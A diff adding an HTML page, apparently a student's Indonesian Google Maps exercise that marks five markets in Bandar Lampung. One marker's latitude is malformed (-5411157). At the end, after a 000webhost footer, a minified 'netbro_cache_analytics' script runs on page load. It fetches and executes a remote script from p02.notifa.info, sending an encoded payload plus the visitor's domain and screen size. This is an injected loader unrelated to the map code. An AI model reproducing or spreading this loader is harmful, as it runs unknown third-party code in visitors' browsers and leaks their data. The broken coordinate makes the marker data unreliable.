@@ -1,0 +1,73 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+      "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Latihan Google  map</title>
+  <style type='text/css'>
+  #peta {
+  width: 100%;
+  height: 400px;
+
+} </style>
+    <script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
+   <script type="text/javascript">
+    
+    (function() {
+  window.onload = function() {
+var map;
+    //Parameter Google maps
+    var options = {
+      zoom: 12, //level zoom
+      //posisi tengah peta
+      center: new google.maps.LatLng(-5.367284, 105.244935),
+      mapTypeId: google.maps.MapTypeId.ROADMAP
+    };
+    
+     // Buat peta di 
+    var map = new google.maps.Map(document.getElementById('peta'), options);
+     // Tambahkan Marker 
+     var locations = [
+       ['Pasar Rajabasa'+'<p>Jl. Kapten Abdul Haq Rajabasa', -5.361542, 105.235378],
+        ['Pasar Prum Batara'+'<p>Jl. Kapten Abdul Haq', -5.357973, 105.236569],
+        ['Pasar Koga'+'<p>	Jl. Teuku Umar Kedaton', -5.391986, 105.261764],
+        ['Pasar Bambu Kuning'+'<p>Jl. Bukit Tinggi Tanjung Karang Pusat', -5411157, 105.255976],
+        ['Pasar Tamin'+'<p>Jl. Tamin Tanjung Karang Pusat', -5.410635, 105.247487]
+    
+    ];
+      var infowindow = new google.maps.InfoWindow();
+
+    var marker, i;
+     /* kode untuk menampilkan banyak marker */
+    for (i = 0; i < locations.length; i++) {  
+      marker = new google.maps.Marker({
+        position: new google.maps.LatLng(locations[i][1], locations[i][2]),
+        map: map,
+         icon: 'images/pin.png'
+      });
+     /* menambahkan event clik untuk menampikan
+          infowindows dengan isi sesuai denga
+        marker yang di klik */
+        
+      google.maps.event.addListener(marker, 'click', (function(marker, i) {
+        return function() {
+          infowindow.setContent(locations[i][0]);
+          infowindow.open(map, marker);
+        }
+      })(marker, i));
+    }
+  
+
+  };
+})();
+
+    </script>
+  </head>
+  <body>
+    
+    <div id="peta"></div>
+
+  <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="000webhost logo" rel="nofollow" target="_blank" href="https://www.hostinger.com/website-000webhostapp-offer?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_campaign=ss-footer_logo&amp;utm_medium=000_logo&amp;utm_content=website_bellaayuoctaria15"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="000webhost logo"></a></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mG90yyiVmdvjPOZOPsuapOTQcAKYo%2fLfcowbpbFIMiRN%2bO7CLBm%2fOAJao0lu6dai7f%2faE%2flliFCFEAha91IHdWpcRJCRjhQVw9X4XkCnMoO75iOPq%2buseVELbEzRxAiGToWFNz%2bk4YsOf6juUwwB4i92cJzAYTfb2o84k0bLPjxoRDXNa5gVAJViwJLKTJyKATB5ARZEbnsqqiYIxUXgFAX%2fyhINnhUy%2fbonT1HzxJTiMgvmWH%2f%2fo3ZWNw0iNTOpsxHmIGn3O84WhDv4mQ0QYPK2FUcm%2bzL6bhVU%2bRSZu5U4WEKGMJDi6DPNOqgv%2bHyTMhYhVYiyCRNjM6OAkRSnHRXQkbgOqeYqFZVDEkqdoHZhYocupYIE0zHx7vhDMiML2n9GDSLwcvTZoxY6hm9vQA6tP93UWugh5Cn19HgvojYKUhNtKIFRwRvcOadkZeos3%2fGaNB%2fDvwF01MjcHIXOtk95KQgG4%2bGlaMrChewOYEoLLU9tDJR%2bMksdDJggPZltteiQ6z2xh%2b%2bBuF93qK3Tdv%2fHB0BAPBmbCN3UqRBHddhN9s68jVgEM6%2bQLLVoZhwnI" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+
